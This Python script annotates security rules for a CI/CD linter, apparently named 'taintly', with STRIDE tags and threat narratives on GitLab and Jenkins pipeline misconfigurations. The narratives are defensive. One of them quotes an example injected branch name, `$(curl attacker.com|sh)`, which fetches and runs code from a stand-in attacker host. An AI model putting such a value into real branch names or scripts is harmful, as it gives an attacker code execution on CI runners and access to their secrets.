#!/usr/bin/env python3
"""One-shot script to inject stride/threat_narrative/incidents into all Rule() definitions.

Each entry in METADATA maps rule_id → dict with keys:
  stride: list[str]
  threat_narrative: str
  incidents: list[str]   (optional)

The script edits each source file in-place, finding the Rule() call for each ID
and appending the new keyword arguments before the closing ),  line.
"""

import re
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent

# ---------------------------------------------------------------------------
# Metadata for all rules not yet annotated
# ---------------------------------------------------------------------------
METADATA: dict[str, dict] = {
    # ── GitLab ──────────────────────────────────────────────────────────────
    "SEC1-GL-001": dict(
        stride=["E", "T"],
        threat_narrative=(
            "Any pipeline trigger — including a compromised branch push or a scheduled job "
            "taken over by an attacker — can deploy directly to production with no human review. "
            "Manual approval gates are the last barrier between automated CI/CD and production "
            "blast radius."
        ),
    ),
    "SEC1-GL-002": dict(
        stride=["E", "S"],
        threat_narrative=(
            "allow_failure: true on a security scan makes the gate silently pass even when "
            "critical vulnerabilities are detected, giving the appearance of compliance without "
            "the enforcement. "
            "An attacker who knows the gate is bypassed can introduce malicious code that would "
            "normally be caught, confident it will not block the pipeline."
        ),
    ),
    "SEC4-GL-001": dict(
        stride=["T", "E"],
        threat_narrative=(
            "Branch names and commit messages are attacker-controlled: a contributor can set a "
            "branch name containing shell metacharacters — such as `$(curl attacker.com|sh)` — "
            "that execute when CI_COMMIT_BRANCH is interpolated unquoted in a script. "
            "The injected commands run with the full permissions of the GitLab runner token."
        ),
    ),
    "SEC4-GL-002": dict(
        stride=["I", "E"],
        threat_narrative=(
            "CI_JOB_TOKEN forwarded to a downstream pipeline grants that pipeline the same "
            "repository access scope as the originating project, potentially bridging trust "
            "boundaries between projects. "
            "A compromised downstream pipeline can use the forwarded token to read protected "
            "variables, push to the upstream repository, or trigger further pipelines."
        ),
    ),
    "SEC4-GL-003": dict(
        stride=["T", "E"],
        threat_narrative=(
            "Git tag and ref names are attacker-controlled strings that can contain shell "
            "metacharacters; when used unquoted in a script they provide a command injection "
            "path exploitable by any contributor who can create a tag or open a merge request. "
            "The injected commands execute with the GitLab runner's permissions and environment."
        ),
    ),
    "SEC4-GL-004": dict(
        stride=["S", "E"],
        threat_narrative=(
            "CI_PIPELINE_SOURCE can be spoofed via the API — an attacker can trigger a pipeline "
            "via the API while setting source=merge_request_event to impersonate legitimate MR "
            "conditions, bypassing gates that check this variable alone. "
            "Access controls must be layered with branch protection and project membership checks."
        ),
    ),
    "SEC4-GL-005": dict(
        stride=["E", "T"],
        threat_narrative=(
            "Merge request pipelines run on the contributor's branch code, giving any contributor "
            "who opens an MR the ability to execute deploy or publish commands that reach production "
            "infrastructure or the package registry with the project's runner token. "
            "Deployment steps should only run on protected branches after merge, not on MR pipelines."
        ),
    ),
    "SEC5-GL-001": dict(
        stride=["T", "D"],
        threat_narrative=(
            "Without resource_group, multiple pipelines targeting the same deployment environment "
            "can run concurrently, causing race conditions where one deployment overwrites the "
            "state established by another or leaves the environment in an inconsistent state. "
            "This is the GitLab equivalent of missing disableConcurrentBuilds in Jenkins."
        ),
    ),
    "SEC6-GL-001": dict(
        stride=["I"],
        threat_narrative=(
            "Secrets committed to pipeline configuration are stored permanently in git history "
            "and readable by anyone who clones the repository, including all contributors and, "
            "in public projects, the entire internet. "
            "Every fork, mirror, and backup of the repository permanently contains the leaked "
            "credential."
        ),
    ),
    "SEC6-GL-002": dict(
        stride=["T", "E"],
        threat_narrative=(
            "Piping a remote URL directly to bash with no integrity check grants the server "
            "operator — or any attacker who can hijack the connection via DNS or BGP — arbitrary "
            "code execution in your pipeline with access to all GitLab CI variables. "
            "Supply chain attacks frequently target popular install scripts precisely because "
            "this pattern is so common."
        ),
    ),
    "SEC6-GL-003": dict(
        stride=["I", "T"],
        threat_narrative=(
            "Disabling TLS verification removes the only cryptographic guarantee that the server "
            "you are talking to is who it claims to be, opening the connection to MITM attacks "
            "that can silently read credentials in transit and substitute malicious responses. "
            "This is especially dangerous when credentials are sent as part of the same request."
        ),
    ),
    "SEC6-GL-004": dict(
        stride=["T", "E"],
        threat_narrative=(
            "eval() executes any string as shell code at runtime, making the pipeline's behavior "
            "dependent on data that may be influenced by external inputs or environment variables. "
            "Attackers who can influence the evaluated string — through environment injection, "
            "compromised scripts, or attacker-controlled CI variables — gain arbitrary code "
            "execution."
        ),
    ),
    "SEC6-GL-005": dict(
        stride=["E"],
        threat_narrative=(
            "chmod 777 grants read, write, and execute permission to every user on the runner "
            "system, including other jobs running concurrently on a shared runner. "
            "On self-hosted runners, world-writable files are a common persistence mechanism "
            "used after initial code execution — modified scripts survive across jobs."
        ),
    ),
    "SEC6-GL-006": dict(
        stride=["T", "E"],
        threat_narrative=(
            "Piping a remote script to bash or executing a URL via shell substitution gives the "
            "remote server arbitrary code execution in your runner with no opportunity to inspect "
            "what will be executed before it runs. "
            "DNS hijacking, CDN compromise, or a supply chain attack on the hosting domain is "
            "sufficient to substitute a malicious payload."
        ),
    ),
    "SEC6-GL-007": dict(
        stride=["I", "E"],
        threat_narrative=(
            "Long-lived cloud credentials that are exfiltrated from a runner environment remain "
            "valid indefinitely until manually rotated, unlike OIDC tokens which expire within "
            "minutes. "
            "An attacker who reads the credential from a log, a job trace, or a compromised runner "
            "gains persistent cloud access independent of the CI/CD system."
        ),
    ),
    "SEC6-GL-008": dict(
        stride=["T"],
        threat_narrative=(
            "Overriding a package registry URL redirects dependency resolution to an attacker-"
            "controlled server, which can serve backdoored packages that appear identical to "
            "legitimate ones — a dependency confusion attack. "
            "This pattern was used to compromise dozens of organisations by registering internal "
            "package names on public registries."
        ),
        incidents=["Dependency confusion attacks (2021, widespread)"],
    ),
    "SEC7-GL-001": dict(
        stride=["I"],
        threat_narrative=(
            "GitLab CI_DEBUG_TRACE enables verbose step-by-step logging that includes the values "
            "of masked CI/CD variables in plain text, bypassing the masking protection. "
            "Attackers with access to job logs can read all secrets while the debug trace is "
            "active, including tokens, API keys, and deployment credentials."
        ),
    ),
    "SEC8-GL-001": dict(
        stride=["T"],
        threat_narrative=(
            "A :latest tag or bare image name resolves to whatever the registry currently holds, "
            "meaning any push to the image repository silently changes the execution environment "
            "for every subsequent pipeline run. "
            "A compromised upstream image executes with full access to all CI/CD variables, "
            "source code, and build artifacts in the job."
        ),
    ),
    "SEC8-GL-002": dict(
        stride=["T", "E"],
        threat_narrative=(
            "An external CI configuration file included from another project without a pinned "
            "commit ref changes with every push to that project, meaning any contributor to the "
            "included configuration can silently modify what your pipeline executes. "
            "A compromised or malicious configuration file has full access to your project's "
            "runner tokens and protected CI/CD variables."
        ),
    ),
    "SEC8-GL-003": dict(
        stride=["T"],
        threat_narrative=(
            "A service container with a :latest tag changes with every upstream push, silently "
            "replacing the service your job depends on. "
            "A compromised service image can intercept requests from the main job, inject "
            "malicious responses, or exfiltrate data passed through shared volumes."
        ),
    ),
    "SEC9-GL-001": dict(
        stride=["I"],
        threat_narrative=(
            "Artifacts without access restriction in a public project are downloadable by anyone "
            "who knows the job URL, including unauthenticated users. "
            "Build outputs may contain compiled binaries, environment dumps, test coverage "
            "reports, or dependency lockfiles that reveal internal library versions useful for "
            "targeted attacks."
        ),
    ),
    "SEC9-GL-002": dict(
        stride=["T"],
        threat_narrative=(
            "Downloading a binary or script without verifying its checksum allows a CDN "
            "compromise, DNS hijacking, or MITM attack to substitute a malicious payload. "
            "The pipeline executes attacker-controlled code with full access to the runner "
            "environment and all CI/CD variables before any integrity check can fire."
        ),
    ),
    "SEC9-GL-003": dict(
        stride=["T"],
        threat_narrative=(
            "A cache without an explicit key can be shared across branches and merge requests, "
            "allowing an attacker who can open an MR to poison the cache consumed by protected "
            "branch pipelines. "
            "Injected cache content — modified node_modules, compiled objects, or tool binaries "
            "— persists into builds that run with higher privileges."
        ),
    ),
    "SEC3-GL-001": dict(
        stride=["T", "E"],
        threat_narrative=(
            "A remote CI configuration included without integrity verification can be modified by "
            "anyone who controls the remote server, injecting arbitrary jobs or overriding "
            "existing stages in your pipeline with no change visible in your repository. "
            "The injected configuration runs with your project's runner token and protected "
            "variable access."
        ),
    ),
    "SEC3-GL-002": dict(
        stride=["T"],
        threat_narrative=(
            "A project include without a pinned ref changes with every commit to the included "
            "project, meaning a contributor to that project can silently modify what your pipeline "
            "executes on the next run. "
            "Pin includes to specific commit SHAs to ensure the included configuration is "
            "immutable."
        ),
    ),
    "SEC3-GL-005": dict(
        stride=["T"],
        threat_narrative=(
            "Docker image tags are mutable: a registry push under the same tag silently replaces "
            "the execution environment for your jobs, giving the image publisher arbitrary code "
            "execution with access to all CI/CD variables and runner-mounted secrets. "
            "Pinning to a SHA256 digest makes the image reference immutable."
        ),
    ),
    "SEC10-GL-001": dict(
        stride=["I", "R"],
        threat_narrative=(
            "CI_JOB_TOKEN and CI_JOB_JWT printed to a job log are accessible to anyone with "
            "read access to the job trace, including pipeline participants who are not project "
            "maintainers. "
            "CI_JOB_TOKEN grants API-level access to the project for the duration of the job "
            "and can be used to read protected variables, trigger pipelines, or access the "
            "package registry."
        ),
    ),
    "SEC10-GL-002": dict(
        stride=["I", "R"],
        threat_narrative=(
            "In public GitLab projects, job logs are accessible to unauthenticated users, meaning "
            "any CI/CD variable value printed to a log — even non-masked ones — is publicly "
            "readable. "
            "Verbose build output, dependency resolution logs, and environment dumps can all "
            "expose internal paths, package versions, and configuration values useful for "
            "targeted attacks."
        ),
    ),
    # ── Jenkins ─────────────────────────────────────────────────────────────
    "SEC1-JK-001": dict(
        stride=["E", "T"],
        threat_narrative=(
            "Without a manual approval gate, any automated pipeline trigger — including a push "
            "from an attacker who has compromised a branch or merged a malicious PR — can "
            "execute production deployment commands with no human review. "
            "A compromised commit reaching the deploy stage has full access to production "
            "infrastructure via the Jenkins agent's credentials."
        ),
    ),
    "SEC1-JK-002": dict(
        stride=["D", "R"],
        threat_narrative=(
            "Without a global timeout, a compromised or hung step can hold the Jenkins executor "
            "and any bound credentials indefinitely, blocking legitimate builds and exfiltrating "
            "secrets for as long as the runner allows. "
            "An explicit timeout limits the blast radius and makes anomalous build durations "
            "immediately visible in the Jenkins dashboard."
        ),
    ),
    "SEC2-JK-001": dict(
        stride=["I"],
        threat_narrative=(
            "Password-type build parameters are stored as plain text in the Jenkins job "
            "configuration, visible in build history via the Jenkins API to anyone with read "
            "access to the job. "
            "Unlike Jenkins credentials, build parameters are not masked in logs and are "
            "exposed in the parameter list for every build run."
        ),
    ),
    "SEC2-JK-002": dict(
        stride=["E", "I"],
        threat_narrative=(
            "Binding a credentialsId from a user-controlled build parameter allows any user "
            "with build trigger access to specify which credential Jenkins retrieves and binds "
            "to the build environment — effectively granting access to arbitrary credentials "
            "in the Jenkins store. "
            "An attacker can enumerate available credential IDs and extract secrets they are "
            "not authorized to use by triggering builds with crafted parameter values."
        ),
    ),
    "SEC3-JK-001": dict(
        stride=["T"],
        threat_narrative=(
            "A shared library loaded without a pinned commit SHA changes with every push to the "
            "library repository, meaning any contributor to that repository can silently modify "
            "what your pipeline executes on the next run. "
            "Shared libraries run as trusted code in the Jenkins Groovy sandbox with full access "
            "to the pipeline's credentials and workspace."
        ),
    ),
    "SEC3-JK-002": dict(
        stride=["T"],
        threat_narrative=(
            "@Grab without a pinned version resolves the dependency from the remote repository "
            "on each run, allowing a malicious or compromised Groovy artifact to be substituted "
            "transparently. "
            "Grabbed dependencies run as trusted Groovy code with access to the full Jenkins "
            "pipeline context including credentials."
        ),
    ),
    "SEC3-JK-003": dict(
        stride=["T"],
        threat_narrative=(
            "docker.image().inside() with a mutable :latest or untagged reference changes the "
            "execution environment silently with every upstream registry push. "
            "The container executes all pipeline commands with access to the workspace, bound "
            "credentials, and environment variables — a compromised image has full build access."
        ),
    ),
    "SEC4-JK-001": dict(
        stride=["T", "E"],
        threat_narrative=(
            "Build parameters are user-controlled strings that can contain shell metacharacters; "
            "when interpolated unquoted into a Groovy GString that becomes a shell command, they "
            "create a command injection path exploitable by any user with job trigger access. "
            "The Groovy string interpolation happens before the shell sees the value, bypassing "
            "shell quoting protections."
        ),
    ),
    "SEC4-JK-002": dict(
        stride=["T", "E"],
        threat_narrative=(
            "SCM-provided environment variables like GIT_BRANCH, GIT_COMMIT, and CHANGE_TITLE "
            "are populated from attacker-controlled git data — branch names and commit messages "
            "can contain shell metacharacters. "
            "When these values are interpolated via Groovy GString syntax into shell commands, "
            "a contributor who can push a crafted branch name achieves command injection."
        ),
    ),
    "SEC4-JK-003": dict(
        stride=["E", "T"],
        threat_narrative=(
            "evaluate() executes arbitrary Groovy code at runtime, completely bypassing the "
            "Jenkins script security sandbox and all method approval restrictions. "
            "An attacker who can influence the evaluated string — through a compromised shared "
            "library, a malicious parameter, or an injected environment variable — gains "
            "unconstrained code execution on the Jenkins controller."
        ),
    ),
    "SEC4-JK-004": dict(
        stride=["S", "E"],
        threat_narrative=(
            "An input step without a submitter restriction allows any Jenkins user — including "
            "those with only read access — to approve a production deployment by clicking "
            "'Proceed'. "
            "Legitimate approval gates depend on submitter restriction to enforce that only "
            "designated release managers or change approvers can authorize deployments."
        ),
    ),
    "SEC4-JK-005": dict(
        stride=["T", "E"],
        threat_narrative=(
            "CHANGE_TITLE, CHANGE_AUTHOR, and related PR-derived variables are populated from "
            "user-controlled PR metadata and can contain shell metacharacters. "
            "When used in Groovy GString interpolation inside a sh() call, a contributor who "
            "controls the PR title or description can inject shell commands that run with the "
            "pipeline's agent permissions."
        ),
    ),
    "SEC5-JK-001": dict(
        stride=["T", "D"],
        threat_narrative=(
            "Without disableConcurrentBuilds, multiple pipeline runs triggered in rapid succession "
            "can execute deployment stages simultaneously against the same environment, causing "
            "race conditions where one deployment overwrites the other or leaves infrastructure "
            "in an inconsistent state. "
            "This is especially dangerous for database migrations or infrastructure provisioning."
        ),
    ),
    "SEC6-JK-001": dict(
        stride=["I"],
        threat_narrative=(
            "Hardcoded credentials in the environment block are stored in the Jenkinsfile in "
            "version control, readable by anyone with repository access including contributors "
            "with read-only roles. "
            "Unlike Jenkins credentials store entries, hardcoded values cannot be rotated "
            "without a code change and are permanently visible in git history."
        ),
    ),
    "SEC6-JK-002": dict(
        stride=["I", "R"],
        threat_narrative=(
            "Echoing a credential variable inside a withCredentials block prints the secret "
            "value to the Jenkins console log, where it is readable by anyone with build log "
            "access and may be stored in log aggregation systems long after the build completes. "
            "Jenkins' credential masking is best-effort — splitting the value across two echoes "
            "or encoding it can bypass masking."
        ),
    ),
    "SEC6-JK-003": dict(
        stride=["I", "R"],
        threat_narrative=(
            "println inside a withCredentials block may print the secret value to the Jenkins "
            "console log via Groovy's implicit string representation of objects that contain "
            "the credential. "
            "Even if masking catches the literal value, derived representations or concatenated "
            "strings containing the credential may appear unmasked."
        ),
    ),
    "SEC6-JK-004": dict(
        stride=["I", "T"],
        threat_narrative=(
            "Disabling TLS certificate verification removes the cryptographic guarantee that "
            "the server you are communicating with is authentic, opening the connection to "
            "MITM attacks that can read credentials in transit and substitute malicious responses. "
            "Credentials sent over an unverified connection are effectively public."
        ),
    ),
    "SEC6-JK-005": dict(
        stride=["I", "E"],
        threat_narrative=(
            "Cloud credentials bound in the environment block are scoped to the entire pipeline "
            "and injected as environment variables into every sh() step, maximising the blast "
            "radius compared to withCredentials scoping. "
            "A leaked AWS_ACCESS_KEY_ID remains valid indefinitely — unlike OIDC tokens which "
            "expire within minutes of the build."
        ),
    ),
    "SEC6-JK-006": dict(
        stride=["I", "T"],
        threat_narrative=(
            "Private key material written to the workspace persists on the Jenkins agent's disk "
            "between builds on permanent agents and may be inadvertently archived if artifact "
            "glob patterns are too broad. "
            "Other pipelines running on the same agent can read workspace files from prior jobs, "
            "exposing the key material to any build that runs on that node."
        ),
    ),
    "SEC6-JK-007": dict(
        stride=["T", "E"],
        threat_narrative=(
            "Groovy GString interpolation inside a bat() call evaluates ${variable} before the "
            "Windows shell sees the command, inserting user-controlled values directly into the "
            "command string without any quoting protection. "
            "An attacker who controls the interpolated parameter can inject CMD metacharacters "
            "that execute arbitrary commands on the Windows build agent."
        ),
    ),
    "SEC7-JK-001": dict(
        stride=["E", "T"],
        threat_narrative=(
            "'agent any' allows the pipeline to run on any available Jenkins node including nodes "
            "with elevated cloud or infrastructure permissions, broadening the blast radius of any "
            "compromise beyond what the pipeline actually requires. "
            "Pinning to a labelled agent restricts execution to nodes with the appropriate "
            "permission scope for the pipeline's tasks."
        ),
    ),
    "SEC7-JK-002": dict(
        stride=["E", "T"],
        threat_narrative=(
            "A node() block without a label constraint runs on any available Jenkins agent, "
            "including nodes with elevated cloud or production credentials that the scripted "
            "pipeline does not require. "
            "Labelling nodes with their permission scope and matching pipeline labels to that "
            "scope enforces least-privilege for build execution."
        ),
    ),
    "SEC7-JK-003": dict(
        stride=["I", "T"],
        threat_narrative=(
            "docker.withRegistry() called with null credentials authenticates anonymously to "
            "the registry, meaning pushed images have no access control and are accessible to "
            "anyone who can reach the registry endpoint. "
            "On internal registries, anonymous pushes also make it impossible to audit which "
            "build published which image, breaking the provenance chain."
        ),
    ),
    "SEC8-JK-001": dict(
        stride=["T"],
        threat_narrative=(
            "A :latest or untagged Docker image used as a Jenkins agent or build container "
            "changes silently with every upstream push to the registry, replacing the execution "
            "environment for your pipeline without any change in the Jenkinsfile. "
            "A compromised image executes all pipeline steps with access to the workspace, "
            "credentials, and environment variables."
        ),
    ),
    "SEC8-JK-002": dict(
        stride=["T", "E"],
        threat_narrative=(
            "Fetching and executing a Groovy script from a remote URL is equivalent to granting "
            "the hosting server arbitrary code execution on the Jenkins controller — Groovy scripts "
            "loaded this way bypass the script security sandbox entirely. "
            "DNS hijacking or server compromise is sufficient to substitute a malicious payload "
            "that runs with full Jenkins controller privileges."
        ),
    ),
    "SEC8-JK-003": dict(
        stride=["T", "I"],
        threat_narrative=(
            "Checking out from a non-HTTPS URL (git:// or http://) sends the repository contents "
            "over an unencrypted connection susceptible to MITM attacks that can inject malicious "
            "code into the checkout. "
            "For private repositories, credentials transmitted over an unencrypted channel are "
            "also exposed to any observer on the network path."
        ),
    ),
    "SEC9-JK-001": dict(
        stride=["T"],
        threat_narrative=(
            "Downloading and executing content without verifying its integrity allows a CDN "
            "compromise, DNS hijacking, or MITM attack to substitute a malicious payload for "
            "the expected installer or script. "
            "The pipeline executes attacker-controlled code with full access to the Jenkins "
            "agent environment and all bound credentials."
        ),
    ),
    "SEC9-JK-002": dict(
        stride=["R", "T"],
        threat_narrative=(
            "Without fingerprinting, there is no verifiable record in Jenkins of which build "
            "produced which archived binary, making it impossible to detect if an artifact was "
            "replaced after archiving. "
            "Fingerprinting records an MD5 hash of each artifact tied to the build that produced "
            "it, providing the minimum evidence chain for supply chain forensics."
        ),
    ),
    "SEC9-JK-003": dict(
        stride=["T"],
        threat_narrative=(
            "wget downloading a binary or script without checksum verification allows a "
            "compromised server or intercepted connection to silently substitute a malicious "
            "payload. "
            "The pipeline then executes attacker-controlled code with access to the Jenkins "
            "agent's credentials and build environment."
        ),
    ),
    "SEC10-JK-001": dict(
        stride=["R"],
        threat_narrative=(
            "Without a post { always { } } block there is no guaranteed cleanup path — temporary "
            "credentials written to disk, debug artifacts, or sensitive workspace files may "
            "persist on the agent between builds. "
            "post { always } is also where audit logging hooks, notification steps, and "
            "forensic artifact uploads should live; omitting it silently removes the audit trail."
        ),
    ),
}

# ---------------------------------------------------------------------------
# Injection logic
# ---------------------------------------------------------------------------

RULE_FILES = [
    ROOT / "taintly/rules/gitlab/sec1_sec4_sec6_sec7_sec9.py",
    ROOT / "taintly/rules/gitlab/sec2_sec4_sec6_sec8_sec9_sec10.py",
    ROOT / "taintly/rules/gitlab/sec3_sec6_supply_chain_creds.py",
    ROOT / "taintly/rules/gitlab/sec8_ungoverned_services.py",
    ROOT / "taintly/rules/jenkins/sec_jenkins.py",
]


def inject(path: Path, metadata: dict[str, dict]) -> int:
    """Inject metadata fields into Rule() definitions. Returns count of injected rules."""
    source = path.read_text(encoding="utf-8")
    count = 0

    for rule_id, meta in metadata.items():
        # Check if this file contains the rule
        if f'id="{rule_id}"' not in source:
            continue

        # Check if already annotated (stride= already present after this rule_id)
        # Find the position of this rule's id= declaration
        id_pos = source.index(f'id="{rule_id}"')
        # Find the closing ), of this Rule() — look for ),\n after the test_negative list
        # We look for the next Rule( or end-of-RULES to bound the search
        next_rule_pos = source.find('    Rule(\n', id_pos + 1)
        if next_rule_pos == -1:
            next_rule_pos = len(source)
        rule_block = source[id_pos:next_rule_pos]

        if 'stride=' in rule_block:
            print(f"  SKIP {rule_id} (already has stride=)")
            continue

        # Find the last test_negative closing ],  or test_positive ],
        # then find the next ),  which closes the Rule()
        # Strategy: find the last line that ends with `],` or `],\n` before next Rule
        # then insert our fields before the closing `    ),`

        # Find closing `    ),` of this Rule block
        # The Rule block starts at id_pos and ends before next_rule_pos
        # Within the block, find `    ),` that closes the Rule()
        close_match = re.search(r'\n    \),\n', source[id_pos:next_rule_pos])
        if not close_match:
            print(f"  WARN {rule_id}: could not find closing ),  — skipping")
            continue

        insert_pos = id_pos + close_match.start() + 1  # +1 to skip the \n before `    ),`

        # Build the injection string
        stride_repr = repr(meta["stride"])
        narrative = meta["threat_narrative"].strip()
        # Build a nicely formatted multi-line string for the narrative
        # Use a raw string with explicit line joins
        incidents = meta.get("incidents", [])

        lines_to_insert = [f"        stride={stride_repr},"]
        lines_to_insert.append(f"        threat_narrative=(")
        # Wrap narrative into ~88-char lines within a string concat
        words = narrative.split()
        current_line = "            \""
        wrapped = []
        for word in words:
            if len(current_line) + len(word) + 1 > 92:
                wrapped.append(current_line + "\"")
                current_line = "            \"" + word + " "
            else:
                current_line += word + " "
        if current_line.strip() != "\"":
            wrapped.append(current_line.rstrip() + "\"")
        lines_to_insert.extend(wrapped)
        lines_to_insert.append("        ),")

        if incidents:
            inc_repr = repr(incidents)
            lines_to_insert.append(f"        incidents={inc_repr},")

        injection = "\n".join(lines_to_insert) + "\n"
        source = source[:insert_pos] + injection + source[insert_pos:]
        count += 1
        print(f"  OK  {rule_id}")

    path.write_text(source, encoding="utf-8")
    return count


def main():
    total = 0
    for path in RULE_FILES:
        print(f"\n=== {path.name} ===")
        n = inject(path, METADATA)
        total += n
        print(f"  -> {n} rules annotated")
    print(f"\nTotal: {total} rules annotated")


if __name__ == "__main__":
    main()
